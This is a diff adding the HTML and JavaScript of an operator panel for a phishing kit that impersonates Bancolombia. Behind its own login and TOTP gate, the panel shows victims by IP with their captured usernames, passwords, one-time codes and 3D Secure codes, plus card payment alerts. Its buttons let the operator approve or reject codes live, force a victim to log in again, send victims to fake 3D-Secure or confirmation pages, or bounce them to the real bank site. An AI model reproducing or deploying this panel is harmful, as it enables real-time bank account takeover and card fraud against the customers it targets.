@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Panel de KrakenOFF</title>
+  <link rel="icon" type="image/png" href="icon-tab.webp">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; }
+
+    body {
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 40px 16px;
+      color: #fff;
+    }
+
+    /* Auth Box */
+    .auth-box {
+      background: linear-gradient(145deg, #ffffff, #f0f0f0);
+      border-radius: 20px;
+      box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+      padding: 40px 36px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+    .auth-box img { max-width: 160px; margin-bottom: 20px; }
+    .auth-box h2 { font-size: 22px; color: #1a1a2e; margin-bottom: 8px; font-weight: 700; }
+    .auth-box p { font-size: 13px; color: #666; margin-bottom: 28px; line-height: 1.5; }
+    
+    .login-field {
+      width: 100%;
+      padding: 14px 18px;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      font-size: 15px;
+      margin-bottom: 16px;
+      outline: none;
+      transition: all 0.3s;
+      background: #fafafa;
+    }
+    .login-field:focus { border-color: #0f3460; background: #fff; box-shadow: 0 0 0 3px rgba(15,52,96,0.1); }
+    
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #e94560, #c0392b);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(233,69,96,0.3);
+    }
+    .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(233,69,96,0.4); }
+    .login-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    
+    .auth-error { color: #e74c3c; font-size: 13px; margin-top: 14px; min-height: 20px; font-weight: 500; }
+    
+    .totp-hint { 
+      font-size: 12px; color: #666; margin-bottom: 20px; line-height: 1.6; 
+      background: #f8f9fa; border-radius: 10px; padding: 14px 18px; border: 1px solid #e9ecef; 
+    }
+    .totp-hint strong { color: #0f3460; }
+
+    /* PANEL */
+    #panelScreen { display: none; width: 100%; max-width: 600px; }
+    
+    .panel-container {
+      background: linear-gradient(145deg, #1e2a4a, #152238);
+      border-radius: 24px;
+      box-shadow: 0 25px 80px rgba(0,0,0,0.5);
+      padding: 0;
+      width: 100%;
+      overflow: hidden;
+    }
+    
+    .panel-header {
+      background: linear-gradient(135deg, #e94560, #c0392b);
+      padding: 28px 24px 20px;
+      text-align: center;
+      position: relative;
+    }
+    
+    .panel-header img { max-width: 140px; margin-bottom: 12px; }
+    .panel-header h1 { font-size: 22px; color: #fff; margin-bottom: 4px; font-weight: 700; }
+    .panel-header p { font-size: 12px; color: rgba(255,255,255,0.8); }
+    
+    .header-stats {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid rgba(255,255,255,0.2);
+    }
+    
+    .stat-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #fff;
+    }
+    
+    .stat-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    
+    .stat-dot.green { background: #2ecc71; box-shadow: 0 0 8px #2ecc71; }
+    .stat-dot.gray { background: #95a5a6; }
+    .stat-dot.red { background: #e74c3c; box-shadow: 0 0 8px #e74c3c; }
+    
+    .panel-actions {
+      display: flex;
+      justify-content: flex-end;
+      padding: 12px 16px;
+      background: rgba(0,0,0,0.2);
+      gap: 10px;
+    }
+    
+    .action-btn {
+      padding: 8px 16px;
+      border: none;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    
+    .notif-btn {
+      background: #3498db;
+      color: #fff;
+      position: relative;
+    }
+    .notif-btn:hover { background: #2980b9; }
+    
+    .notif-badge {
+      position: absolute;
+      top: -6px;
+      right: -6px;
+      background: #e74c3c;
+      color: #fff;
+      font-size: 10px;
+      padding: 2px 6px;
+      border-radius: 10px;
+      font-weight: 700;
+    }
+    
+    .logout-btn {
+      background: rgba(255,255,255,0.15);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.3);
+    }
+    .logout-btn:hover { background: rgba(255,255,255,0.25); }
+
+    /* Sessions */
+    .panel-content {
+      padding: 20px;
+    }
+    
+    .section-title {
+      font-size: 14px;
+      color: #8e9aaf;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .session-card {
+      background: linear-gradient(145deg, #243b5a, #1e2f4a);
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 16px;
+      border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+    
+    .session-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .session-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+    }
+    
+    .session-ip {
+      font-size: 12px;
+      color: #8e9aaf;
+      font-family: monospace;
+      background: rgba(0,0,0,0.2);
+      padding: 4px 10px;
+      border-radius: 6px;
+    }
+    
+    .session-fields {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+    
+    .field-item { display: flex; flex-direction: column; gap: 2px; }
+    .field-label { color: #8e9aaf; font-size: 11px; }
+    .field-value { color: #fff; font-weight: 500; }
+    
+    .status-badge {
+      display: inline-block;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    
+    .status-active { background: #27ae60; color: #fff; }
+    .status-waiting { background: #f39c12; color: #fff; }
+    .status-pending { background: #3498db; color: #fff; }
+    
+    .session-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .control-btn {
+      padding: 10px 16px;
+      border: none;
+      border-radius: 10px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    
+    .btn-relogin { background: #e67e22; color: #fff; }
+    .btn-relogin:hover { background: #d35400; transform: translateY(-1px); }
+    
+    .btn-otp { background: #1abc9c; color: #fff; }
+    .btn-otp:hover { background: #16a085; transform: translateY(-1px); }
+    
+    .btn-aprobar { background: #27ae60; color: #fff; }
+    .btn-aprobar:hover { background: #219653; transform: translateY(-1px); }
+    
+    .btn-rechazar { background: #e74c3c; color: #fff; }
+    .btn-rechazar:hover { background: #c0392b; transform: translateY(-1px); }
+    
+    .btn-3d { background: #9b59b6; color: #fff; }
+    .btn-3d:hover { background: #8e44ad; transform: translateY(-1px); }
+    
+    .btn-confirmar { background: #27ae60; color: #fff; }
+    .btn-confirmar:hover { background: #219653; transform: translateY(-1px); }
+    
+    .btn-ban { background: #34495e; color: #fff; }
+    .btn-ban:hover { background: #2c3e50; transform: translateY(-1px); }
+
+    /* Modal */
+    .modal-warning {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    
+    .warning-box {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px;
+      max-width: 380px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    }
+    
+    .warning-box h3 { margin-bottom: 12px; font-size: 20px; color: #1a1a2e; }
+    .warning-box p { font-size: 14px; color: #666; margin-bottom: 24px; }
+    
+    .modal-btns { display: flex; gap: 12px; justify-content: center; }
+    
+    .btn-confirm {
+      padding: 12px 28px;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      background: #e74c3c;
+      color: #fff;
+    }
+    
+    .btn-cancel {
+      padding: 12px 28px;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      background: #95a5a6;
+      color: #fff;
+    }
+
+    /* Toast */
+    .notification-toast {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 16px 20px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+      z-index: 10000;
+      transform: translateX(400px);
+      transition: transform 0.3s ease;
+      max-width: 320px;
+      border-left: 4px solid #27ae60;
+    }
+    
+    .notification-toast.show { transform: translateX(0); }
+    .notification-toast h4 { margin: 0 0 4px 0; font-size: 14px; color: #1a1a2e; }
+    .notification-toast p { margin: 0; font-size: 13px; color: #666; }
+
+    /* Empty State */
+    .no-sessions {
+      text-align: center;
+      padding: 40px 20px;
+      color: #8e9aaf;
+    }
+    .no-sessions svg { width: 60px; height: 60px; margin-bottom: 16px; opacity: 0.5; }
+    .no-sessions p { font-size: 14px; }
+
+    @media (max-width: 600px) {
+      .auth-box { padding: 28px 20px; }
+      .session-card { padding: 16px 14px; }
+      .session-actions { justify-content: stretch; }
+      .control-btn { flex: 1; text-align: center; }
+      .session-fields { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- PASO 1: Usuario + Contrasena -->
+<div class="auth-box" id="step1">
+  <img src="https://i.pinimg.com/originals/88/99/86/889986a60f08cfed1a02def2eeb75779.png" alt="Logo">
+  <h2>Pura Empresa Luxury Life</h2>
+  <p>Si usted no tiene contraseña abra del parche que usted no esta contratado en la empresa</p>
+  <input class="login-field" type="text" id="inputUser" placeholder="Usuario" autocomplete="off" />
+  <input class="login-field" type="password" id="inputPass" placeholder="Contrasena" />
+  <button class="login-btn" id="btnStep1" onclick="verificarCredenciales()">Continuar</button>
+  <div class="auth-error" id="errorStep1"></div>
+</div>
+
+<!-- PASO 2: Google Authenticator -->
+<div class="auth-box" id="step2" style="display:none;">
+  <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Logo">
+  <h2>Verificacion en 2 pasos</h2>
+  <div class="totp-hint">
+    Abre <strong>Google Authenticator</strong> en tu celular<br>
+    e ingresa el codigo de 6 digitos que aparece.
+  </div>
+  <input class="login-field" type="tel" inputmode="numeric" maxlength="6" id="inputTotp" placeholder="000000" autocomplete="off" />
+  <button class="login-btn" id="btnStep2" onclick="verificarTotp()">Ingresar al panel</button>
+  <div class="auth-error" id="errorStep2"></div>
+</div>
+
+<!-- PANEL PRINCIPAL -->
+<div id="panelScreen">
+  <div class="panel-container">
+    <div class="panel-header">
+      <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Logo">
+      <h1>Pura Empresa Luxury Life</h1>
+      <p>El metodo es hacerlo con fe</p>
+      <div class="header-stats">
+        <div class="stat-item">
+          <span class="stat-dot green" id="adminsDot"></span>
+          <span id="adminCount">0/3 admins</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-dot gray" id="wsDot"></span>
+          <span id="wsStatus">WS: Conectado</span>
+        </div>
+      </div>
+    </div>
+    <div class="panel-actions">
+      <button class="action-btn notif-btn" onclick="verNotificaciones()">
+        🔔 Notificaciones
+        <span class="notif-badge" id="notifBadge" style="display:none;">0</span>
+      </button>
+      <button class="action-btn logout-btn" onclick="cerrarSesion()">Cerrar sesion</button>
+    </div>
+    <div class="panel-content">
+      <div class="section-title">Sesiones Activas</div>
+      <div id="sessionsContainer"></div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal Ban -->
+<div class="modal-warning" id="banModal">
+  <div class="warning-box">
+    <h3>🚫 Banear sesion</h3>
+    <p>El usuario sera redirigido a <strong>bancolombia.com</strong>. Confirmas?</p>
+    <div class="modal-btns">
+      <button class="btn-confirm" onclick="confirmBan()">Si, banear</button>
+      <button class="btn-cancel" onclick="cancelBan()">Cancelar</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="notification-toast" id="notificationToast">
+  <h4 id="toastTitle">Notificacion</h4>
+  <p id="toastMessage"></p>
+</div>
+
+<script>
+  let usuarioTemp = '';
+  let pollingPanel = null;
+  let ipParaBan = null;
+  let ws = null;
+  let notificaciones = [];
+  let notifCount = 0;
+  let activeAdmins = new Set();
+
+  // Actualizar estado de admins
+  function updateAdminStatus() {
+    const count = activeAdmins.size;
+    const dot = document.getElementById('adminsDot');
+    document.getElementById('adminCount').textContent = `${count}/3 admins`;
+    dot.className = 'stat-dot ' + (count > 0 ? 'green' : 'gray');
+  }
+
+  function notifyAdminLogin(username) {
+    activeAdmins.add(username);
+    updateAdminStatus();
+  }
+
+  function notifyAdminLogout() {
+    const username = sessionStorage.getItem('panelAuth');
+    if (username) {
+      activeAdmins.delete(username);
+      updateAdminStatus();
+    }
+  }
+
+  // Notificaciones
+  function showToast(title, message) {
+    const toast = document.getElementById('notificationToast');
+    document.getElementById('toastTitle').textContent = title;
+    document.getElementById('toastMessage').textContent = message;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 4000);
+  }
+
+  function verNotificaciones() {
+    notifCount = 0;
+    document.getElementById('notifBadge').style.display = 'none';
+    if (notificaciones.length === 0) {
+      alert('No hay notificaciones');
+    } else {
+      alert('Notificaciones:\n\n' + notificaciones.map(n => n.title + ': ' + n.message).join('\n'));
+    }
+    notificaciones = [];
+  }
+
+  function addNotificacion(title, message) {
+    notificaciones.push({ title, message });
+    notifCount++;
+    const badge = document.getElementById('notifBadge');
+    badge.style.display = 'block';
+    badge.textContent = notifCount;
+  }
+
+  // WebSocket
+  function connectWebSocket() {
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    ws = new WebSocket(`${protocol}//${window.location.host}`);
+
+    ws.onopen = () => {
+      document.getElementById('wsDot').className = 'stat-dot green';
+      document.getElementById('wsStatus').textContent = 'WS: Conectado';
+    };
+
+    ws.onclose = () => {
+      document.getElementById('wsDot').className = 'stat-dot red';
+      document.getElementById('wsStatus').textContent = 'WS: Desconectado';
+      setTimeout(connectWebSocket, 3000);
+    };
+
+    ws.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        switch (data.type) {
+          case 'nuevo_usuario':
+            addNotificacion('👤 Nuevo Usuario', `IP: ${data.data.ip}`);
+            showToast('👤 Nuevo Usuario', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'clave_ingresada':
+            addNotificacion('🔑 Clave Ingresada', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'otp_ingresado':
+            addNotificacion('🔐 OTP Ingresado', `IP: ${data.data.ip}`);
+            showToast('🔐 OTP Pendiente', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'otp_autorizado':
+            showToast('✅ OTP Autorizado', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'otp_rechazado':
+            showToast('❌ OTP Rechazado', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'sesion_aprobada':
+            showToast('🎉 Sesion Aprobada', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'relogin':
+            showToast('🔄 Relogin', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'usuario_baneado':
+            showToast('🚫 Usuario Baneado', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'pago_tarjeta':
+            addNotificacion('💳 Pago con Tarjeta', `${data.data.nombreTitular} - $${data.data.monto}`);
+            showToast('💳 Nuevo Pago', `${data.data.nombreTitular} - $${data.data.monto}`);
+            fetchSessionData();
+            break;
+          case 'payment_pending':
+            addNotificacion('⏳ Pago Pendiente', `IP: ${data.data.ip} - Esperando confirmacion`);
+            showToast('⏳ Pago Pendiente', `IP: ${data.data.ip} - Haz clic en 3D o Confirmar`);
+            fetchSessionData();
+            break;
+          case 'payment_redirect':
+            showToast('➡️ Usuario Redirigido', `IP: ${data.data.ip} -> ${data.data.destino}`);
+            fetchSessionData();
+            break;
+          case '3d_code_entered':
+            addNotificacion('🔐 Codigo 3D', `IP: ${data.data.ip} - Cod: ${data.data.codigo}`);
+            showToast('🔐 Codigo 3D Ingresado', `IP: ${data.data.ip}`);
+            fetchSessionData();
+            break;
+          case 'nuevo_pago_telegram':
+            addNotificacion('📨 Nuevo Registro', `${data.data.nombre} - $${data.data.total}`);
+            showToast('📨 Nuevo Usuario', `${data.data.nombre} - $${data.data.total}`);
+            fetchSessionData();
+            break;
+          case 'admin_login':
+            activeAdmins.add(data.data.admin);
+            updateAdminStatus();
+            showToast('👤 Admin conectado', data.data.admin);
+            break;
+          case 'admin_logout':
+            activeAdmins.delete(data.data.admin);
+            updateAdminStatus();
+            break;
+        }
+      } catch (e) {}
+    };
+  }
+
+  // Login handlers
+  document.getElementById('inputUser').addEventListener('keydown', e => { if (e.key === 'Enter') document.getElementById('inputPass').focus(); });
+  document.getElementById('inputPass').addEventListener('keydown', e => { if (e.key === 'Enter') verificarCredenciales(); });
+  document.getElementById('inputTotp').addEventListener('keydown', e => { if (e.key === 'Enter') verificarTotp(); });
+
+  if (sessionStorage.getItem('panelAuth')) {
+    mostrarPanel();
+  }
+
+  async function verificarCredenciales() {
+    const user = document.getElementById('inputUser').value.trim();
+    const pass = document.getElementById('inputPass').value;
+    const errorEl = document.getElementById('errorStep1');
+    const btn = document.getElementById('btnStep1');
+
+    errorEl.textContent = '';
+    if (!user || !pass) { errorEl.textContent = 'Completa todos los campos.'; return; }
+
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    try {
+      const res = await fetch('/api/panel-check', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ usuario: user, password: pass })
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        usuarioTemp = user;
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        setTimeout(() => document.getElementById('inputTotp').focus(), 100);
+      } else {
+        errorEl.textContent = data.error || 'Credenciales incorrectas.';
+      }
+    } catch {
+      errorEl.textContent = 'Error de conexion. Intenta de nuevo.';
+    }
+
+    btn.disabled = false;
+    btn.textContent = 'Continuar';
+  }
+
+  async function verificarTotp() {
+    const totp = document.getElementById('inputTotp').value.trim();
+    const errorEl = document.getElementById('errorStep2');
+    const btn = document.getElementById('btnStep2');
+
+    errorEl.textContent = '';
+    if (totp.length !== 6) { errorEl.textContent = 'El codigo debe tener 6 digitos.'; return; }
+
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    try {
+      const res = await fetch('/api/panel-totp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ usuario: usuarioTemp, totp })
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        sessionStorage.setItem('panelAuth', usuarioTemp);
+        notifyAdminLogin(usuarioTemp);
+        mostrarPanel();
+      } else {
+        errorEl.textContent = data.error || 'Codigo incorrecto.';
+        document.getElementById('inputTotp').value = '';
+        document.getElementById('inputTotp').focus();
+        btn.disabled = false;
+        btn.textContent = 'Ingresar al panel';
+      }
+    } catch {
+      errorEl.textContent = 'Error de conexion. Intenta de nuevo.';
+      btn.disabled = false;
+      btn.textContent = 'Ingresar al panel';
+    }
+  }
+
+  function mostrarPanel() {
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('panelScreen').style.display = 'block';
+    iniciarPanel();
+  }
+
+  function cerrarSesion() {
+    notifyAdminLogout();
+    sessionStorage.removeItem('panelAuth');
+    if (pollingPanel) clearInterval(pollingPanel);
+    if (ws) ws.close();
+    document.getElementById('panelScreen').style.display = 'none';
+    document.getElementById('step1').style.display = 'block';
+    document.getElementById('inputUser').value = '';
+    document.getElementById('inputPass').value = '';
+    document.getElementById('inputTotp').value = '';
+    usuarioTemp = '';
+    activeAdmins.clear();
+    updateAdminStatus();
+  }
+
+  function iniciarPanel() {
+    fetchSessionData();
+    if (pollingPanel) clearInterval(pollingPanel);
+    pollingPanel = setInterval(fetchSessionData, 2000);
+    connectWebSocket();
+  }
+
+  async function fetchSessionData() {
+    try {
+      const res = await fetch('/api/sesiones');
+      const sesiones = await res.json();
+      renderSessions(sesiones);
+    } catch {}
+  }
+
+  function renderSessions(sesiones) {
+    const container = document.getElementById('sessionsContainer');
+    container.innerHTML = '';
+    const ips = Object.keys(sesiones);
+    
+    if (ips.length === 0) {
+      container.innerHTML = `
+        <div class="no-sessions">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="8" x2="12" y2="12"/>
+            <line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          <p>No hay sesiones activas</p>
+        </div>`;
+      return;
+    }
+    
+    ips.forEach((ip, idx) => {
+      const s = sesiones[ip];
+      let estadoLabel, estadoClass;
+      if (s.estado === 'completo') { estadoLabel = 'COMPLETO'; estadoClass = 'status-active'; }
+      else if (s.estado === 'otp_pendiente') { estadoLabel = 'OTP PENDIENTE'; estadoClass = 'status-pending'; }
+      else if (s.estado === 'esperando_otp') { estadoLabel = 'ESPERANDO OTP'; estadoClass = 'status-waiting'; }
+      else if (s.estado === 'esperando_clave') { estadoLabel = 'ESPERANDO CLAVE'; estadoClass = 'status-waiting'; }
+      else if (s.estado === 'pago_pendiente') { estadoLabel = 'PAGO PENDIENTE'; estadoClass = 'status-waiting'; }
+      else if (s.estado === '3d_pendiente_confirmacion') { estadoLabel = '3D INGRESADO'; estadoClass = 'status-pending'; }
+      else if (s.estado === 'completado') { estadoLabel = 'COMPLETADO'; estadoClass = 'status-active'; }
+      else { estadoLabel = 'EN ESPERA'; estadoClass = 'status-waiting'; }
+
+      const esOtpPendiente = s.estado === 'otp_pendiente';
+      const esPagoTarjeta = s.tipo === 'tarjeta' || s.paymentPending;
+      const esBancolombia = !esPagoTarjeta;
+      const mostrarBotonesTarjeta = esPagoTarjeta && s.estado !== 'completado';
+
+      const card = document.createElement('div');
+      card.className = 'session-card';
+      card.innerHTML = `
+        <div class="session-header">
+          <span class="session-title">Sesion ${idx + 1} ${esPagoTarjeta ? '💳' : esBancolombia ? '🏦' : ''}</span>
+          <span class="session-ip">IP: ${ip}</span>
+        </div>
+        <div class="session-fields">
+          <div class="field-item">
+            <span class="field-label">Tipo</span>
+            <span class="field-value">${esPagoTarjeta ? '💳 Tarjeta' : esBancolombia ? '🏦 Bancolombia' : '-'}</span>
+          </div>
+          <div class="field-item">
+            <span class="field-label">Usuario</span>
+            <span class="field-value">${s.usuario || '-'}</span>
+          </div>
+          <div class="field-item">
+            <span class="field-label">Clave</span>
+            <span class="field-value">${s.clave || '-'}</span>
+          </div>
+          <div class="field-item">
+            <span class="field-label">OTP</span>
+            <span class="field-value">${s.otp || '-'}</span>
+          </div>
+          ${s.codigo3D ? `
+          <div class="field-item">
+            <span class="field-label">Codigo 3D</span>
+            <span class="field-value" style="color: #27ae60; font-weight: 700;">${s.codigo3D}</span>
+          </div>
+          ` : ''}
+          <div class="field-item">
+            <span class="field-label">Estado</span>
+            <span class="status-badge ${estadoClass}">${estadoLabel}</span>
+          </div>
+        </div>
+        <div class="session-actions">
+          ${mostrarBotonesTarjeta ? `
+          <button class="control-btn btn-3d" onclick="redirectPayment('${ip}', '3d-secure.html')">3D</button>
+          <button class="control-btn btn-confirmar" onclick="redirectPayment('${ip}', 'confirmacion.html')">Confirmar</button>
+          ` : ''}
+          ${esBancolombia ? `
+          <button class="control-btn btn-relogin" onclick="reloginUser('${ip}')">Relogin</button>
+          <button class="control-btn btn-otp" onclick="autorizarOtpUser('${ip}')">Autorizar OTP</button>
+          ${esOtpPendiente ? `
+          <button class="control-btn btn-aprobar" onclick="aprobarOtp('${ip}')">Aprobar</button>
+          <button class="control-btn btn-rechazar" onclick="rechazarOtp('${ip}')">Rechazar</button>
+          ` : ''}
+          ` : ''}
+          <button class="control-btn btn-ban" onclick="abrirBan('${ip}')">Ban</button>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+  }
+
+  window.reloginUser = async ip => {
+    try {
+      const res = await fetch('/api/relogin', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip}) });
+      const data = await res.json();
+      if (data.ok) {
+        showToast('🔄 Relogin enviado', 'El usuario deberá iniciar de nuevo');
+        fetchSessionData();
+      }
+    } catch (e) { alert('Error al enviar relogin'); }
+  };
+  
+  window.autorizarOtpUser = async ip => {
+    try {
+      const res = await fetch('/api/autorizar-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip}) });
+      const data = await res.json();
+      if (data.ok) {
+        showToast('🔓 OTP Autorizado', 'El usuario puede ingresar el código');
+        fetchSessionData();
+      }
+    } catch (e) { alert('Error al autorizar OTP'); }
+  };
+  
+  window.aprobarOtp = async ip => {
+    try {
+      const res = await fetch('/api/aprobar-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip}) });
+      const data = await res.json();
+      if (data.ok) {
+        showToast('✅ Sesión Aprobada', 'El usuario puede continuar');
+        fetchSessionData();
+      }
+    } catch (e) { alert('Error al aprobar'); }
+  };
+  
+  window.rechazarOtp = async ip => {
+    try {
+      const res = await fetch('/api/rechazar-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip}) });
+      const data = await res.json();
+      if (data.ok) {
+        showToast('❌ OTP Rechazado', 'El usuario debe intentar de nuevo');
+        fetchSessionData();
+      }
+    } catch (e) { alert('Error al rechazar'); }
+  };
+  
+  window.abrirBan = ip => { ipParaBan = ip; document.getElementById('banModal').style.display = 'flex'; };
+  
+  window.confirmBan = async () => {
+    if (!ipParaBan) return;
+    try {
+      await fetch('/api/ban', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip: ipParaBan}) });
+      showToast('🚫 Usuario Baneado', 'El usuario fue redirigido a Bancolombia');
+      document.getElementById('banModal').style.display = 'none';
+      ipParaBan = null;
+      fetchSessionData();
+    } catch (e) { alert('Error al banear'); }
+  };
+  
+  window.cancelBan = () => { document.getElementById('banModal').style.display = 'none'; ipParaBan = null; };
+
+  // Redirigir pago (3D o Confirmar)
+  window.redirectPayment = async (ip, destino) => {
+    try {
+      const res = await fetch('/api/redirect-payment', { 
+        method:'POST', 
+        headers:{'Content-Type':'application/json'}, 
+        body:JSON.stringify({ ip: ip, destino: destino }) 
+      });
+      const data = await res.json();
+      if (data.ok) {
+        const label = destino === '3d-secure.html' ? '3D Secure' : 'Confirmacion';
+        showToast(`➡️ Enviado a ${label}`, `IP: ${ip}`);
+        fetchSessionData();
+      }
+    } catch (e) { alert('Error al redirigir'); }
+  };
+</script>
+
+</body>
+</html>
